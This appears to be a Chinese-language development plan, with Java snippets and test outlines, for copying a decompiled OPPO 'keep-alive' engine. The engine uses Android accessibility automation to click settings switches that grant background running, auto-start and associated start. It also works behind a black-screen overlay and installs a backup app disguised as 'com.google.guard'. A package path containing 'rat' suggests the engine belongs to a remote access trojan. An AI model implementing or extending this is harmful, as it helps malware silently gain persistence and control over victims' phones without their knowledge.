# OPPO 厂商引擎 TDD 复刻计划

## Context

Vendor `o/v.java` (526行) 是 OPPO ColorOS 的保活引擎。
Replica `OppoEngine.java` (735行) 已有基本框架，但有多处差异需要对齐。

**核心差异**: replica 的 Switch 操作用 `findClickableParent + findOneByCombine(checkBox/switch) + click`，vendor 用 `findOneByCombineWithChild(CombineFilterWithChild(K(), filter)) + R(row, retries)` 坐标点击。

---

## A. Vendor vs Replica 差异总表

### A.1 架构对比

| 维度 | Vendor o/v.java | Replica OppoEngine.java | 差距 |
|------|----------------|------------------------|------|
| 继承 | `extends o.c` | `extends AutoEngine` | ✅ 等价 |
| 构造参数 | `super(w0(), "com.android.settings")` | `super(buildAllMatchers(), SETTINGS)` | ✅ 正确 |
| 超时 | 100 秒 | 100 秒 | ✅ 一致 |
| 字段数 | 4 (1 AtomicReference + 3 AtomicBoolean) | 4 | ✅ 正确 |
| ListenWindow | 12 个 | 13 个 | ⚠️ replica 多了 1 个 |
| 状态数 | 4 | 4 | ✅ 一致 |
| Switch 操作 | `CombineFilterWithChild + R()` 坐标点击 | `findClickableParent + checkbox.click` | ❌ 操作模式不同 |
| 事件处理 | `super.u()` 电池对话框 | 无 | ❌ 缺失 |
| finish() | 完整清理 (X+P().x+PIP判断+遮罩+策略) | 简化 | ⚠️ 不完整 |
| 完成流程 u0() | 检查备份应用安装 | TODO 标记 | ⚠️ 不完整 |

### A.2 方法逐项对比

| Vendor 方法 | 行号 | Replica 方法 | 状态 | 差距描述 |
|-------------|------|-------------|------|----------|
| `w0()` | 181-196 | `buildAllMatchers()` | ⚠️ | vendor 12个LW，replica 13个 (多了 oplus FrameLayout 无 matchs) |
| `u()` | 439-491 | `onAccessibilityEvent()` | ⚠️ | replica 缺少 `super.u()` (电池优化对话框) |
| `Z()` | 243-283 | `finish()` | ⚠️ | replica 缺少 X()/P().x()/PIP判断/遮罩/策略通知 |
| `u0()` | 493-526 | `handleCompletion()` | ⚠️ | replica 缺少备份应用安装检查 |
| `D0(String)` | 218-241 | `saveKeepAliveState()` | ✅ | 基本对齐 |
| `r0()` | 351-383 | `handleFullBackgroundSwitch()` | ❌ | vendor用 `findOneByCombineWithChild(K(),e0()) + R(row,0)`，replica用简化click |
| `s0()` | 385-410 | `handleAutoStartSwitch()` | ❌ | vendor用 `findOneByCombineWithChild(K(),c0()) + R(row,5)`，replica用简化click |
| `t0()` | 412-437 | `handleRelateStartSwitch()` | ❌ | vendor用 `findOneByCombineWithChild(K(),f0()) + R(row,5)`，replica用简化click |
| `k0()` | 303-318 | `k0()` | ⚠️ | vendor 根据 keepAliveType 动态选包名，replica 静态 |
| `l0()` | 320-336 | `l0()` | ⚠️ | vendor 4个LW含matchs，replica 4个无matchs |
| `j0()` | 285-301 | `j0()` | ⚠️ | vendor 4个LW含matchs(d0)，replica 4个含null className |
| `m0()` | 338-349 | `m0()` | ✅ | 对齐 |
| `equals()` | — | *(缺失)* | ❌ | 未实现 |
| `hashCode()` | — | *(缺失)* | ❌ | 未实现 |

### A.3 字段对比

| Vendor 字段 | 类型 | 初始值 | Replica 字段 | 状态 |
|-------------|------|--------|-------------|------|
| `f700r` | `AtomicReference<r.e>` | KEEP_ALIVE_UNKNOWN | keepAliveType | ✅ |
| `f701s` | `AtomicBoolean` | false | allowFullBackground | ✅ |
| `f702t` | `AtomicBoolean` | false | allowAutoStart | ✅ |
| `f703u` | `AtomicBoolean` | false | allowRelateStart | ✅ |

---

## B. Vendor ListenWindow 完整清单 w0() (行 181-196)

| # | 构造方法 | packageName | className | matchs | 说明 |
|---|----------|-------------|-----------|--------|------|
| 0 | `c.J()` | com.android.settings | android.app.Dialog | — | 电池优化对话框 |
| 1 | `A0(主包名)` | com.android.settings | InstalledAppDetailsTop | H(主包名) | 应用详情(主) |
| 2 | `A0(备包名)` | com.android.settings | InstalledAppDetailsTop | H(备包名) | 应用详情(备) |
| 3 | `v0(主包名)` | com.android.settings | FrameLayout | H(主包名) | 设置FrameLayout(主) |
| 4 | `v0(备包名)` | com.android.settings | FrameLayout | H(备包名) | 设置FrameLayout(备) |
| 5 | `y0()` | com.oplus.battery | PowerControlActivity | — | oplus 耗电管理 |
| 6 | `q0()` | com.coloros.oppoguardelf | PowerControlActivity | — | coloros 耗电管理 |
| 7 | `g0()` | com.oplus.battery | androidx.appcompat.app.b | d0() | oplus AndroidX 对话框 |
| 8 | `n0()` | com.oplus.battery | coui.dialog.app.a | d0() | oplus COUI 对话框 |
| 9 | `h0()` | com.oplus.battery | *(null)* | d0() | oplus 通用对话框 |
| 10 | `o0()` | com.coloros.oppoguardelf | *(null)* | d0() | coloros 通用对话框 |
| 11 | `z0()` | com.oplus.battery | StartupAppListActivity | — | 自启动管理 |

**Replica 差异**: 多了一个无 matchs 的 oplus FrameLayout (#x0 但不在 w0 列表中)

### C. 窗口检测方法对比

| 方法 | Vendor 行号 | Vendor LW | Replica LW | 差异 |
|------|------------|-----------|------------|------|
| `k0()` | 303-318 | A0(动态包名)+v0(动态包名) | 静态 InstalledAppDetailsTop+FrameLayout | ❌ replica 无动态包名 |
| `l0()` | 320-336 | y0()+x0()+q0()+p0() | oplus/coloros PowerControl+FrameLayout | ⚠️ vendor x0/p0 有matchs(i0)，replica无 |
| `j0()` | 285-301 | g0()+n0()+h0()+o0() | oplus/coloros 对话框 | ⚠️ vendor 有matchs(d0)，replica用null className |
| `m0()` | 338-349 | z0() | z0() | ✅ |

### D. 关键操作差异: Switch 操作模式

**Vendor 模式** (r0/s0/t0):
```java
// 1. findOneByCombineWithChild — 查找包含指定子元素的行
UiObject row = k().findOneByCombineWithChild(new CombineFilterWithChild(K(), filter));
// K() = clickable row filter, filter = text filter (e0/c0/f0)
// 2. R(row, retries) — 坐标点击操作
CheckedResult result = R(row, retries);  // retries: r0=0, s0=5, t0=5
// R() 找到 Switch/CheckBox 的坐标并点击
```

**Replica 模式** (当前):
```java
UiObject target = k().findOneByCombine(textFilter);
UiObject parent = target.findClickableParent();
UiObject checkBox = parent.findOneByCombine(CombineFilter.or(checkBox(), switchWidget()));
checkBox.click();
```

**差距**: vendor 用 `CombineFilterWithChild` 一步定位到包含指定文本的 clickable 行，然后用 `R()` 坐标点击。replica 分步查找，可能找错目标。

---

## E. TDD Phase 分解

### Phase 1: Switch 操作对齐 r0/s0/t0

**目标**: 将 3 个 Switch 操作改为 vendor 的 `findOneByCombineWithChild + R()` 模式

#### 1.1 RED: 测试

文件: `OppoEngineSwitchTest.java` (新建)

```
testHandleFullBackground_usesFindWithChild_andR
  // mock: k().findOneByCombineWithChild(K(), e0()) → found
  // mock: R(found, 0) → CheckedResult(true, true)
  // assert: f701s (allowFullBackground) == true

testHandleFullBackground_fallback_b0
  // mock: e0() → null, b0() → found
  // assert: 使用 b0() filter 查找

testHandleFullBackground_checked_waitsForDialog
  // mock: R → checked → T0(10) → j0()=false
  // assert: allowFullBackground.set(true)

testHandleAutoStart_usesFindWithChild_andR
  // mock: k().findOneByCombineWithChild(K(), c0()) → found
  // mock: R(found, 5) → CheckedResult(true, true)
  // assert: f702t (allowAutoStart) == true

testHandleAutoStart_notChecked_setsFalse
  // mock: R → not checked
  // assert: allowAutoStart == false

testHandleRelateStart_usesFindWithChild_andR
  // mock: k().findOneByCombineWithChild(K(), f0()) → found
  // mock: R(found, 5) → CheckedResult(true, true)
  // assert: f703u (allowRelateStart) == true

testHandleRelateStart_notFound_logs
  // mock: findOneByCombineWithChild → null
  // assert: 记录错误日志
```

#### 1.2 GREEN: 实现

```java
// r0() — vendor 行 351-383
private boolean handleFullBackgroundSwitch() {
    try {
        // vendor: findOneByCombineWithChild(K(), e0()) → R(row, 0)
        UiNode row = findRowWithChild(buildFullBackgroundFilter());
        if (row == null) {
            row = findRowWithChild(buildAllowBackgroundFilter());
        }
        if (row != null) {
            CheckedResult result = R(row, 0);
            if (result.isClicked()) Log.d(TAG, "已点击完全允许后台行为");
            if (result.isChecked()) {
                T0(10);
                if (!j0()) {
                    allowFullBackground.set(true);
                    return true;
                }
                return false;
            }
        }
        return false;
    } catch (Exception e) { ... }
}

// s0() — vendor 行 385-410
private boolean handleAutoStartSwitch() {
    UiNode row = findRowWithChild(buildAllowAutoStartFilter());
    if (row != null) {
        CheckedResult result = R(row, 5);
        if (result.isChecked()) { allowAutoStart.set(true); return true; }
        allowAutoStart.set(false);
    }
    return false;
}

// t0() — vendor 行 412-437
private boolean handleRelateStartSwitch() {
    UiNode row = findRowWithChild(buildRelateStartFilter());
    if (row != null) {
        CheckedResult result = R(row, 5);
        if (result.isChecked()) { allowRelateStart.set(true); return true; }
    }
    return false;
}

// 工具: 对应 vendor k().findOneByCombineWithChild(K(), filter)
private UiNode findRowWithChild(CombineFilter childFilter) {
    UiNode root = k();
    if (root == null || childFilter == null) return null;
    return root.findOneByCombineWithChild(CombineFilter.clickable(), childFilter);
}
```

测试数: 7

---

### Phase 2: 事件处理 + 电池对话框检测

**目标**: 添加 `checkBatteryOptimizationDialog()` 调用，修正 `isCompleted()` → `T()`

#### 2.1 RED: 测试

追加到 `OppoEngineStateMachineTest.java` (新建):

```
testOnEvent_callsCheckBatteryDialog
  // event != null → checkBatteryOptimizationDialog 被调用

testOnEvent_completed_skips
  // T() == true → 不处理

testOnEvent_k0Match_clearsOther3States
  // k0() 匹配 → 清除 PowerControl + Dialog + Startup

testOnEvent_l0Match_enqueuesPowerControl
testOnEvent_j0Match_enqueuesDialog
testOnEvent_m0Match_enqueuesStartup
```

#### 2.2 GREEN: 实现

```java
@Override
public void onAccessibilityEvent(AccessibilityEvent event, String pkg, String cls) {
    try {
        if (T()) return;  // 修正: isCompleted() → T()
        currentPackage = pkg;
        currentClassName = cls;
        // vendor u():445-446 — 添加电池优化对话框检测
        if (event != null) {
            checkBatteryOptimizationDialog();
        }
        // ... 其余状态机逻辑不变
    }
}
```

测试数: 6

---

### Phase 3: finish() 对齐 + 完成流程 u0()

**目标**: 对齐 vendor Z() 完整清理流程，修复 u0() 的备份应用检查

#### 3.1 RED: 测试

文件: `OppoEngineFinishTest.java` (新建)

```
testFinish_callsX_pause
testFinish_callsSaveState
testFinish_shutdownScheduler
testFinish_clearsStateQueue
testFinish_removesBlackScreen_orPIP
testFinish_notifiesStrategy

testCompletion_mainApp_backupInstalled_switchesToBackup
  // keepAliveType=MAIN, 备份已安装
  // assert: keepAliveType → BACKUP, 清零 3 个标志

testCompletion_mainApp_backupNotInstalled_finishes
  // keepAliveType=MAIN, 备份未安装
  // assert: Z()

testCompletion_mainApp_backupAlreadyDone_finishes
  // 备份已完成 → Z()

testCompletion_backupApp_finishes
  // keepAliveType=BACKUP
  // assert: D0("com.google.guard") + Z()
```

#### 3.2 GREEN: 实现

```java
// Z() — vendor 行 243-283
@Override
public void finish() {
    if (lock.tryLock()) {
        try {
            if (!T()) {
                updateProgress(100);
                X();
                if (MyAccessibilityService.getInstance() != null) {
                    MyAccessibilityService.getInstance().H(true, true);
                }
                if (KA_MAIN.equals(keepAliveType.get())) {
                    saveKeepAliveState(getAppName());
                }
                if (KA_BACKUP.equals(keepAliveType.get())) {
                    saveKeepAliveState("com.google.guard");
                }
                scheduler.shutdownNow();
                stateQueue.clear();
                T0(5);
                removeBlackScreen();
                if (MainApplication.getInstance() != null) {
                    MainApplication.getInstance()
                        .offerStrategyEvent("PREPARE_FOR_APP_CONFIRM_LOCK");
                }
            }
        } catch (Exception e) { logError("finish", e); }
        finally { lock.unlock(); }
    }
    super.finish();
}

// u0() — vendor 行 493-526
private void handleCompletion() {
    try {
        if (!allowFullBackground.get()) return;
        String type = keepAliveType.get();
        if (KA_MAIN.equals(type)) {
            saveKeepAliveState(getAppName());
            stateQueue.clear();
            allowFullBackground.set(false);
            allowAutoStart.set(false);
            allowRelateStart.set(false);
            // vendor: 检查备份应用是否已完成 + 是否已安装
            if (isBackupAppInstalled("com.google.guard")) {
                keepAliveType.set(KA_BACKUP);
                startSilent(SETTINGS, INSTALLED_APP_DETAILS);
            } else {
                finish();
            }
        } else if (KA_BACKUP.equals(type)) {
            saveKeepAliveState("com.google.guard");
            finish();
        }
    } catch (Exception e) { logError("handleCompletion", e); }
}
```

测试数: 10

---

### Phase 4: equals/hashCode + 清理

**目标**: 添加 equals/hashCode，清理遗留 TODO 和 ADAPT 注释

#### 4.1 RED: 测试

```
testEquals_sameType_returnsTrue
testEquals_differentType_returnsFalse
testHashCode_consistent
```

#### 4.2 GREEN: 实现

```java
@Override
public boolean equals(Object obj) { return obj instanceof OppoEngine; }

@Override
public int hashCode() { return Objects.hash(OppoEngine.class.getName()); }
```

测试数: 3

---

## F. 文件清单

### 修改的文件

| 文件 | 修改内容 |
|------|----------|
| `vendor/OppoEngine.java` | Switch操作改为R()+finishOpioCombineWithChild, 事件添加checkBatteryDialog, finish对齐, u0()修复, equals/hashCode |

### 新建的测试文件

| 文件 | 测试内容 | 测试数 |
|------|----------|--------|
| `OppoEngineSwitchTest.java` | Switch 操作对齐 r0/s0/t0 | 7 |
| `OppoEngineStateMachineTest.java` | 事件处理+电池对话框 | 6 |
| `OppoEngineFinishTest.java` | finish+完成流程 | 10 |
| (追加 equals/hashCode) | | 3 |

**总计: 26 个测试用例**

---

## G. 验证命令

```bash
cd /home/code/php/project/full-package/android

./gradlew testDebugUnitTest --tests "com.vendor.rat.auto.engine.vendor.OppoEngine*"
./gradlew test  # 全量回归
```

---

## H. 执行顺序与依赖

```
Phase 1 (Switch操作对齐) ──→ Phase 2 (事件处理) ──→ Phase 3 (finish+完成流程)
                                                          │
                                                          ▼
                                                     Phase 4 (equals+清理)
```

Phase 1 是核心修改 (Switch 操作模式变更)，Phase 2-4 相对简单。

---

## I. Vendor 源码行号索引

| 方法 | Vendor 行号 | Replica 方法 | Phase |
|------|------------|-------------|-------|
| 构造函数 | 42-53 | constructor | — (已对齐) |
| `w0()` | 181-196 | buildAllMatchers | — (已对齐) |
| `k0()` | 303-318 | k0 | — (已对齐) |
| `l0()` | 320-336 | l0 | — (已对齐) |
| `j0()` | 285-301 | j0 | — (已对齐) |
| `m0()` | 338-349 | m0 | — (已对齐) |
| `r0()` | 351-383 | handleFullBackgroundSwitch | 1 |
| `s0()` | 385-410 | handleAutoStartSwitch | 1 |
| `t0()` | 412-437 | handleRelateStartSwitch | 1 |
| `u()` | 439-491 | onAccessibilityEvent | 2 |
| `Z()` | 243-283 | finish | 3 |
| `u0()` | 493-526 | handleCompletion | 3 |
| `D0(String)` | 218-241 | saveKeepAliveState | — (已对齐) |
| `B0()` | 63-71 | buildPowerManageFilter | — (已对齐) |
| `C0()` | 73-81 | buildPowerManage2Filter | — (已对齐) |
| `b0()` | 83-88 | buildAllowBackgroundFilter | 1 |
| `c0()` | 90-95 | buildAllowAutoStartFilter | 1 |
| `d0()` | 97-102 | buildAllowButtonFilter | — (已对齐) |
| `e0()` | 104-109 | buildFullBackgroundFilter | 1 |
| `f0()` | 111-117 | buildRelateStartFilter | 1 |
| `i0()` | 135-141 | buildAppInBackgroundFilter | — (已对齐) |
